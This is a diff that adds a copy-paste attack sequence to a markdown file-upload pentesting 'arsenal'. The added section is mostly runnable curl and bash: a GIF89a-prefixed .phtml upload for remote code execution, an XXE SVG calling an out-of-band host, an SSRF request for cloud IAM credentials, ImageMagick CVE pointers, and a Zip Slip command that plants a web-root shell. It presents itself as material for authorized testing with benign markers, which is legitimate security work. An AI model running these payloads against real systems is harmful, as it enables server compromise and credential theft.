@@ -1,6 +1,61 @@
 # File Upload Attack Arsenal — Bypass Tables, Polyglots & Payloads
 
+**Author:** x8bitranjit
+
 > Companion to `FILE_UPLOAD_TESTING_GUIDE.md`. **Baseline first** (guide §4: where stored / what URL / which handler) — that decides which of these to use. Replace `YOUR.oast.fun` with your Collaborator/interactsh host. Authorized targets only; benign markers only; delete artifacts after (guide §26).
+
+---
+
+## 0. The whole attack in one sequence (copy-paste — RCE web shell)
+
+*What & when:* the end-to-end flagship as runnable commands — the arsenal twin of guide **§12.4**. Run top-to-bottom against an authorized target; each step's output tells you whether to continue or pivot. Everything is a **benign marker**; stop the instant RCE prints.
+
+```bash
+T=https://shop.target.com; C='session=<your own account A>'      # authorized target + YOUR cookie
+
+# --- Stage 0: BASELINE — upload one honest file, read WHERE/WHAT-URL/HOW (guide §4) ---
+curl -s -b "$C" -F 'avatar=@me.png;type=image/png' "$T/account/avatar"      # -> note the returned "url"
+URL=$(curl -s -b "$C" -F 'avatar=@me.png;type=image/png' "$T/account/avatar" | grep -o '/uploads[^"]*')
+curl -sI "$T$URL"        # <- (2) app origin? (3) Content-Type / Server / X-Powered-By / nosniff / Content-Disposition
+# DECISION: web root + app origin + PHP/ASPX/JSP handler + no nosniff -> RCE reachable, continue.
+#           usercontent-CDN + attachment + nosniff + re-encoded random name -> pivot to §14/§15/§16.
+
+# --- Stage 1: CLASSIFY the validator (guide §6.1) — same intent, 4 ways; watch which are rejected ---
+for f in \
+  'me.php;type=image/png'          `# name blocked?         -> denylist on extension` \
+  'me.png;type=text/plain'         `# CT header trusted?    -> Model A if this 403s` \
+  'me.phtml;type=image/png'        `# with TEXT body        -> bytes checked? Model C/D` \
+  ; do echo "== $f =="; curl -s -b "$C" -F "avatar=@me.png;filename=$f" "$T/account/avatar"; echo; done
+# Accepted with a GIF89a prefix but rejected as text  => Model C (libmagic).  .phtml accepted => denylist gap.
+
+# --- Stage 2: BYPASS — GIF89a-prefixed .phtml carrying a benign RCE marker (Model C + denylist gap) ---
+printf 'GIF89a;\n<?php echo "RCE-POC-".md5("x8bit-2026")."-".php_uname(); ?>\n' > me.phtml
+SHURL=$(curl -s -b "$C" -F 'avatar=@me.phtml;type=image/png' "$T/account/avatar" | grep -o '/uploads[^"]*')
+
+# --- Stage 3: TRIGGER — request the stored file; the handler executes it ---
+curl -s "$T$SHURL"        # <- "RCE-POC-<hash>-Linux <host> ..."  == remote code execution PROVEN
+
+# --- Stage 4: STOP. Do NOT escalate to an interactive shell. Delete the artifact, then report Critical (CWE-434).
+```
+
+**Alternate cash-outs (same Stages 0/1/4, swap Stage 2 — pick by what baseline showed the server DOES with the file):**
+```bash
+# Server PARSES XML (SVG preview / DOCX import)  -> XXE OOB file-read (guide §14):
+printf '%s\n' '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY % p SYSTEM "http://YOUR.oast.fun/x.dtd"> %p;]>' \
+  '<svg xmlns="http://www.w3.org/2000/svg"><text>x</text></svg>' > xxe.svg
+curl -s -b "$C" -F 'avatar=@xxe.svg;type=image/svg+xml' "$T/account/avatar"   # watch YOUR.oast.fun for a hit
+
+# "Import from URL" present  -> SSRF to cloud metadata (guide §15) — the fastest Critical when it exists:
+curl -s -b "$C" "$T/account/avatar/from-url" \
+  --data-urlencode 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'   # -> IAM creds?
+
+# Re-encodes/thumbnails every image  -> attack the PROCESSOR, don't bypass it (guide §16):
+#   ImageMagick CVE-2022-44268 file-read (crafted PNG names a server file, embedded in the output) or
+#   ImageTragick CVE-2016-3714 delegate RCE (benign OOB) — trigger = any resize/convert/thumbnail.
+
+# Extracts archives (plugin/theme/backup-restore)  -> Zip Slip web-root shell (guide §17):
+python3 poc/make_zipslip.py --entry '../../../../var/www/html/shell.phtml' --payload poc/webshell_marker.php
+```
 
 ---
 
